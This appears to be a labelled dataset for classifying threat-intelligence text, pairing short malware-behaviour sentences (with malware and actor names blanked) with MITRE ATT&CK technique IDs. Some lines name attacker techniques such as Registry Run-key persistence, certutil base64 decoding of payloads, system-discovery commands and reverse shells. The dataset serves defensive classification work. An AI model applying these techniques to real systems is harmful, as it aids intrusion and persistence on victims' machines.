text1	labels
starts a rootkit from a malicious file dropped to disk.	['T1014', 'T1014']
can collect the victim user name.	['T1033', 'T1033']
"""beacon"" payload is capable of running shell commands without cmd.exe and PowerShell commands without powershell.exe"	['T1106']
actors look for and use VPN profiles during an operation to access the network using external VPN services.	['T1133']
actors used a victim's endpoint management platform, Altiris, for lateral movement.	['T1072']
actors used the following commands after exploiting a machine with  malware to obtain information about the OS: ver >> %temp%\download systeminfo >> %temp%\download	['T1082']
adds a Visual Basic script in the Startup folder to deploy the payload.	['T1064']
adds itself to a Registry Run key with the name guidVGA or guidVSA.	['T1547.001']
adds itself to the Registry key HKEY_CURRENT_USER\Software\Microsoft\CurrentVersion\Run\ for persistence.	['T1547.001']
adds itself to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to establish persistence upon reboot.	['T1547.001']
Adversaries can direct  to execute from the command-line on infected hosts, or have  create a reverse shell.	['T1059']
After creating a new service for persistence,  sets the file creation time for the service to the creation time of the victim's legitimate svchost.exe file.	['T1070.006']
After re-establishing access to a victim network,  actors download tools including  and WCE that are staged temporarily on websites that were previously compromised but never used.	['T1105']
aggregates staged data from a network into a single location.	['T1074']
A  macro has run a PowerShell command to decode file contents.  has also used  to decode base64-encoded files on victims.	['T1140']
A  malware sample conducts C2 over HTTP.	['T1071']
A module in  allows arbitrary commands to be executed by invoking C:\Windows\System32\cmd.exe.	['T1059']
A module in  collects passwords stored in applications installed on the victim.	['T1003']
Analysis of  has shown that it regularly undergoes technical improvements to evade anti-virus detection.	['T1027.005']
An  macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload.	['T1140']
A  tool can add the binary’s path to the Registry key Software\Microsoft\Windows\CurrentVersion\Run to add persistence.	['T1547.001']
automatically exfiltrates collected files via removable media when an infected device is connected to the second victim after receiving commands from the first victim.	['T1020']
A  variant gathers network interface card information.	['T1016']
A variant of  appends junk data to the end of its DLL file to create a large file that may exceed the maximum size that anti-virus programs can scan.	['T1027.001']
C2 messages are encrypted with custom stream ciphers using six-byte or eight-byte keys.	['T1573']
can access a connected webcam and capture pictures.	['T1125']
can add a certificate to the Windows store.	['T1553.004']
can add a Run key entry in the Registry to establish persistence.	['T1547.001']
can be configured to have commands relayed over a peer-to-peer network of infected hosts if some of the hosts do not have Internet access.	['T1090']
can be used to display adapter configuration on Unix systems, including information for TCP/IP, DNS, and DHCP.	['T1016']
can be used to embed a PowerShell script within the pixels of a PNG file.	['T1027']
can be used to gather information on permission groups within a domain.	['T1069']
can create a Windows account.	['T1136']
can delete all files created during its execution.	['T1070.004']
can delete files that may interfere with it executing. It also can delete temporary files and itself after the initial script executes.	['T1070.004']
